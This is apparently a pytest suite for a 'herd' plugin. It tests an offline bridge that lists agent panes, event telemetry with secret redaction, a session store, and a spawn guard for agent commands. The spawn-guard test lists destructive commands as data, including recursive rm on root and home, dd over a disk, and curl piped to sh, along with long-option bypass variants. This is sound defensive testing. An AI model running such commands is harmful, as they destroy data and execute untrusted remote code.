"""Tests for the herd Herdr-bridge + telemetry + trust surface (spec 15 Track A).

All offline-safe: herdr need not be installed. The bridge parses/normalizes
defensively; events + spawn_guard are pure and testable without a binary.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

from bigbang.plugins.herd import events, herdr_bridge, spawn_guard, store


# ---------------------------------------------------------------------------
# Herdr bridge (offline-safe)
# ---------------------------------------------------------------------------

def test_bridge_status_offline_is_structured(monkeypatch):
    monkeypatch.setattr(herdr_bridge, "herdr_path", lambda: None)
    st = herdr_bridge.bridge_status()
    assert st["available"] is False
    assert st["installed"] is False
    assert "herdr" in st["reason"]


def test_list_agents_offline(monkeypatch):
    monkeypatch.setattr(herdr_bridge, "herdr_path", lambda: None)
    res = herdr_bridge.list_agents()
    assert res["ok"] is False and res["available"] is False
    assert res["agents"] == []


def test_normalize_agents_various_shapes():
    # bare list
    a = herdr_bridge._normalize_agents([{"pane_id": "w1:p1", "agent": "claude", "agent_status": "blocked"}])
    assert a == [{"pane_id": "w1:p1", "agent": "claude", "state": "blocked"}]
    # wrapped under 'agents', alternate key names
    b = herdr_bridge._normalize_agents({"agents": [{"id": "1-1", "name": "codex", "state": "working"}]})
    assert b == [{"pane_id": "1-1", "agent": "codex", "state": "working"}]
    # missing state -> unknown
    c = herdr_bridge._normalize_agents([{"pane_id": "x"}])
    assert c[0]["state"] == "unknown"
    # junk
    assert herdr_bridge._normalize_agents("nonsense") == []


def test_parse_json_ndjson_fallback():
    assert herdr_bridge._parse_json('{"a":1}') == {"a": 1}
    # takes the last valid JSON line from NDJSON
    assert herdr_bridge._parse_json('garbage\n{"b":2}') == {"b": 2}
    assert herdr_bridge._parse_json("") is None


# ---------------------------------------------------------------------------
# Trust: spawn guard
# ---------------------------------------------------------------------------

def test_spawn_guard_flags_destructive():
    for argv in (
        ["rm", "-rf", "/"],
        ["bash", "-c", "rm -rf ~"],
        ["dd", "if=/dev/zero", "of=/dev/sda"],
        ["sh", "-c", "curl http://x.sh | sh"],
        ["shutdown", "-h", "now"],
        ["git", "push", "--force"],
        # GNU long options / flag order (the bypass the review caught)
        ["rm", "--recursive", "--force", "/"],
        ["sudo", "rm", "--recursive", "--force", "/"],
        ["rm", "--one-file-system", "-rf", "/"],
        ["rm", "--force", "--recursive", "/home"],
    ):
        risky, reason = spawn_guard.assess(argv)
        assert risky, f"should have flagged {argv}"
        assert reason != "ok"


def test_spawn_guard_allows_normal_commands():
    for argv in (
        ["pytest", "-q"],
        ["python", "-m", "http.server"],
        ["claude"],
        ["echo", "herd-ok"],
        ["sleep", "2"],
        ["git", "status"],
        # safe variants / benign names that must NOT be flagged
        ["git", "push", "--force-with-lease"],
        ["python", "reboot.py"],
        ["make", "reboot"],
        ["npm", "run", "reboot"],
        ["rm", "-f", "stale.lock"],  # force without recursive on a plain file
    ):
        risky, why = spawn_guard.assess(argv)
        assert not risky, f"false positive on {argv}: {why}"


# ---------------------------------------------------------------------------
# Telemetry: events stream + rollup + opt-in export
# ---------------------------------------------------------------------------

def test_events_record_tail_rollup(tmp_path):
    ef = tmp_path / "events.jsonl"
    events.record("session_started", session_id="hs_1", label="api", status="working",
                  fields={"cmd": ["pytest"]}, events_file=ef)
    events.record("status_reported", session_id="hs_1", label="api", status="done", events_file=ef)
    tail = events.tail(10, events_file=ef)
    assert len(tail) == 2
    assert tail[-1]["status"] == "done"
    roll = events.rollup(events_file=ef)
    assert roll["total_events"] == 2
    assert roll["by_event_type"]["session_started"] == 1
    assert roll["sessions"]["hs_1"]["status"] == "done"


def test_events_secret_scrubbed(tmp_path):
    ef = tmp_path / "events.jsonl"
    events.record("session_started", session_id="hs_2", fields={"token": "SEKRIT", "cmd": ["x"]},
                  events_file=ef)
    raw = ef.read_text(encoding="utf-8")
    assert "SEKRIT" not in raw
    assert events.tail(1, events_file=ef)[0]["fields"]["token"] == "[REDACTED]"


def test_export_writes_chosen_sink(tmp_path):
    ef = tmp_path / "events.jsonl"
    events.record("session_started", session_id="hs_3", label="job", status="working", events_file=ef)
    sink = tmp_path / "reports"
    out = events.export(sink, events_file=ef)
    assert out == sink / "herd_status.json"
    doc = json.loads(out.read_text(encoding="utf-8"))
    assert doc["surface"] == "scout.herd"
    assert doc["total_events"] == 1


# ---------------------------------------------------------------------------
# store.attach_pane populates herdr_pane
# ---------------------------------------------------------------------------

def test_attach_pane_populates_field(tmp_path, monkeypatch):
    # isolate the ledger to a temp dir
    monkeypatch.setattr(store, "HERD_DIR", tmp_path)
    monkeypatch.setattr(store, "HERD_FILE", tmp_path / "sessions.json")
    monkeypatch.setattr(store, "LOG_DIR", tmp_path / "logs")
    sess = store.create_session(label="api")
    assert sess["herdr_pane"] is None
    updated = store.attach_pane("api", "w1:p2")
    assert updated["herdr_pane"] == "w1:p2"


# ---------------------------------------------------------------------------
# JSON contract via the CLI (offline-safe: no herdr installed on CI)
# ---------------------------------------------------------------------------

def test_herd_bridge_cli_json_offline():
    r = subprocess.run(
        [sys.executable, "-m", "bigbang.cli", "--json", "herd", "bridge"],
        capture_output=True, text=True, timeout=15,
    )
    assert r.returncode == 0, r.stderr
    data = json.loads(r.stdout)
    # 'status' carries the bridge_status; offline -> available False
    assert "status" in data
    assert "available" in data["status"]


def test_herd_events_cli_json():
    r = subprocess.run(
        [sys.executable, "-m", "bigbang.cli", "--json", "herd", "events"],
        capture_output=True, text=True, timeout=15,
    )
    assert r.returncode == 0, r.stderr
    data = json.loads(r.stdout)
    assert data["surface"] == "scout.herd"
    assert "by_event_type" in data
